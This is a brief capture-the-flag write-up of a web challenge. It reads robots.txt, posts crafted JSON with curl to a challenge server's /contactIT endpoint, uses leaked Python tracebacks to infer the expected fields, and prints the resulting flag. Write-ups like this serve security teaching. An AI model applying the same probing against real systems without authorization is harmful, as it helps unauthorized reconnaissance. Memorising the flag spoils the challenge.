
Visit the website and we get "Website down! please contact IT for more information"

Try robots.txt

```sh
DISALLOW     contactIT
DISALLOW     countdown
```

/contactIT more interesting since the webpage told use to do that

make  a request to /contactIT

We get 
```sh
Post:Json Request Only
```

So add header
`Content-Type: application/json`
and in POST body just add {} and send the request

We get an error back

```python
  File "/app/webapp.py", line 26, in submitted
    f.checkResponds(messege)
  File "/app/floaty.py", line 17, in checkResponds
    if "flag" in responds:
```

So its probably checking for `messege` with value `flag` in JSON body

```sh
curl http://3.23.56.243:9008/contactIT -H "Content-type: application/json" -X POST -d '{"messege":"flag"}'
```

We get error back in response

```python
  File "/app/webapp.py", line 26, in submitted
    f.checkResponds(messege)
  File "/app/floaty.py", line 18, in checkResponds
    self.sendFlag()
  File "/app/floaty.py", line 27, in sendFlag
    server.sendmail(self.email, self.sendto, self.flag)
  File "/usr/local/lib/python3.12/smtplib.py", line 880, in sendmail
    for each in to_addrs:
TypeError: 'NoneType' object is not iterable
```

We see `server.sendmail()` so server is trying to send mail. In description they tell us that
`Don't blow up their inbox though :) and make sure you clearly tell them what you want.`

So maybe we need to provide our email

```sh
curl http://3.23.56.243:9008/contactIT -H "Content-type: application/json" -X POST -d '{"messege":"flag","email":"ourEmail"}'
```

And we get the flag in our email

flag : texsaw{7h15_15_7h3_r34l_fl46_c0n6r47ul4710n5}